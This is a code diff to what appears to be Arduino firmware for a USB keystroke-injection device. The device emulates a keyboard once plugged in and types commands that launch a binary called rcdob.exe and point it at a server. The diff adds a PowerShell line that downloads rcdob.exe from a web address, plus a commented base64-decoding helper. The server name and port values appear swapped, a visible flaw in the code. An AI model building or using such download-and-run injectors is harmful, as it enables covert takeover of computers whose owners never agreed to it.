@@ -4,6 +4,8 @@ char binaryCmdline[] = "start rcdob.exe ";
 char userAgentConfig[] = "set RCDO_USERAGENT=firefox";
 char serverNameConfig[] = "set RCDO_SERVERPORT=localhost";
 char serverPortConfig[] = "set RCDO_SERVERNAME=5000";
+char powershellCmd[] = "iwr -Uri \"http://127.0.0.1/download\" -OutFile rcdob.exe";
+//$file = ".\input.txt"; [System.Convert]::FromBase64String((Get-Content $file)) | Set-Content output.bin -Encoding Byte
 
 
 float getVCC() {
@@ -100,6 +102,7 @@ void setupConfig(){
 }
 
 void startBinary(int option){
+  SerialMonitorInterface.print(getVCC());
   pinMode(LED_BUILTIN, OUTPUT);
 
   // blocking loop until plugged in
@@ -121,7 +124,7 @@ void startBinary(int option){
   // due to some funky windows USB recognition
   delay(1000);
   Keyboard.begin();
-  runPS();
+  //runPS();
   setupConfig();
   char buf[560];
   strcpy(buf,binaryCmdline);
